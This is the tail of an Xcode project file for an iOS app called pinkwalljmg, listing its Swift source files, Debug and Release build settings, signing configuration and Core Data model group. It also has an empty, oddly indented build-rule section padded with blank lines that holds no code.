				18F75F64263671E600CD51ED /* Validation.swift in Sources */,
				18AE7DD1261F5107007F7C98 /* ForgotPasswordView.swift in Sources */,
				18F75F732636739800CD51ED /* Parser.swift in Sources */,
				184F3A7126450C180056567D /* PlacePicker.swift in Sources */,
				1835A23F264696D80020ED79 /* BlogModel.swift in Sources */,
				18F75F702636739400CD51ED /* NetworkAdapter.swift in Sources */,
				18F75F60263671E600CD51ED /* JSONHelper.swift in Sources */,
				18DDAA72261F1EBD00A1CBAF /* pinkwalljmg.xcdatamodeld in Sources */,
				18DDAA6B261F1EBD00A1CBAF /* AppDelegate.swift in Sources */,
				1843E813262066F800154CC9 /* CheckBoxView.swift in Sources */,
				1835A236264668460020ED79 /* ContactAdmin.swift in Sources */,
				188D062726494F1A006159D5 /* MessageView.swift in Sources */,
				181C529B26456A0C009C2289 /* UserPreference.swift in Sources */,
				18E4A5462621C11F0095EA86 /* HomeView.swift in Sources */,
				18F75F6A2636730F00CD51ED /* LoginSignup+API.swift in Sources */,
				18026B562626C8F600C6BF28 /* ChangePasswordView.swift in Sources */,
				18514E8D2626B517008DEDDD /* BlogDetail.swift in Sources */,
				1835A2452646A8A90020ED79 /* GridCollection.swift in Sources */,
				184F3A6E26450AA20056567D /* HtmlContent.swift in Sources */,
				18DDAA6D261F1EBD00A1CBAF /* SceneDelegate.swift in Sources */,
				18F75F5F263671E600CD51ED /* Utilities.swift in Sources */,
				18F75F63263671E600CD51ED /* UtilityFunctions.swift in Sources */,
				18AE7DD5261F66A0007F7C98 /* ImagePIcker.swift in Sources */,
				18E4A54D2621C77C0095EA86 /* TermsView.swift in Sources */,
				18E4A5422621C06C0095EA86 /* SideMenu.swift in Sources */,
				18DDAA84261F203100A1CBAF /* LoginView.swift in Sources */,
				18E4A5532621C8260095EA86 /* ProfileView.swift in Sources */,
				18F75F6D2636735700CD51ED /* ApiConstants.swift in Sources */,
				18F75F62263671E600CD51ED /* Toast.swift in Sources */,
				18DDAA6F261F1EBD00A1CBAF /* ContentView.swift in Sources */,
				184F3A422644F74F0056567D /* TermsModel.swift in Sources */,
				188D062A26494F54006159D5 /* ContentMessageView.swift in Sources */,
				18F75F61263671E600CD51ED /* StringExtensions.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		18DDAA78261F1EBF00A1CBAF /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				18DDAA79261F1EBF00A1CBAF /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		18DDAA7C261F1EBF00A1CBAF /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.4;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		18DDAA7D261F1EBF00A1CBAF /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.4;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		18DDAA7F261F1EBF00A1CBAF /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 4A377BEFC5F06C151638F046 /* Pods-pinkwalljmg.debug.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_IDENTITY = "iPhone Developer";
				CODE_SIGN_STYLE = Manual;
				DEVELOPMENT_ASSET_PATHS = "\"pinkwalljmg/Preview Content\"";
				DEVELOPMENT_TEAM = R99R64PAKE;
				ENABLE_PREVIEWS = YES;
				INFOPLIST_FILE = pinkwalljmg/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 14.1;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.pinkwalljmg;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = pink_dev;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		18DDAA80261F1EBF00A1CBAF /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 48855DF1978340A328BF1466 /* Pods-pinkwalljmg.release.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_IDENTITY = "iPhone Developer";
				CODE_SIGN_STYLE = Manual;
				DEVELOPMENT_ASSET_PATHS = "\"pinkwalljmg/Preview Content\"";
				DEVELOPMENT_TEAM = R99R64PAKE;
				ENABLE_PREVIEWS = YES;
				INFOPLIST_FILE = pinkwalljmg/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 14.1;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.pinkwalljmg;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = pink_dev;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		18DDAA62261F1EBD00A1CBAF /* Build configuration list for PBXProject "pinkwalljmg" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				18DDAA7C261F1EBF00A1CBAF /* Debug */,
				18DDAA7D261F1EBF00A1CBAF /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		18DDAA7E261F1EBF00A1CBAF /* Build configuration list for PBXNativeTarget "pinkwalljmg" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				18DDAA7F261F1EBF00A1CBAF /* Debug */,
				18DDAA80261F1EBF00A1CBAF /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

		
			/* Begin PBXBuildRule section */


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	
			

			
	
			/* End PBXBuildRule section */
		
		

/* Begin XCVersionGroup section */
		18DDAA70261F1EBD00A1CBAF /* pinkwalljmg.xcdatamodeld */ = {
			isa = XCVersionGroup;
			children = (
				18DDAA71261F1EBD00A1CBAF /* pinkwalljmg.xcdatamodel */,
			);
			currentVersion = 18DDAA71261F1EBD00A1CBAF /* pinkwalljmg.xcdatamodel */;
			path = pinkwalljmg.xcdatamodeld;
			sourceTree = "<group>";
			versionGroupType = wrapper.xcdatamodel;
		};
/* End XCVersionGroup section */
	};
	rootObject = 18DDAA5F261F1EBD00A1CBAF /* Project object */;
}
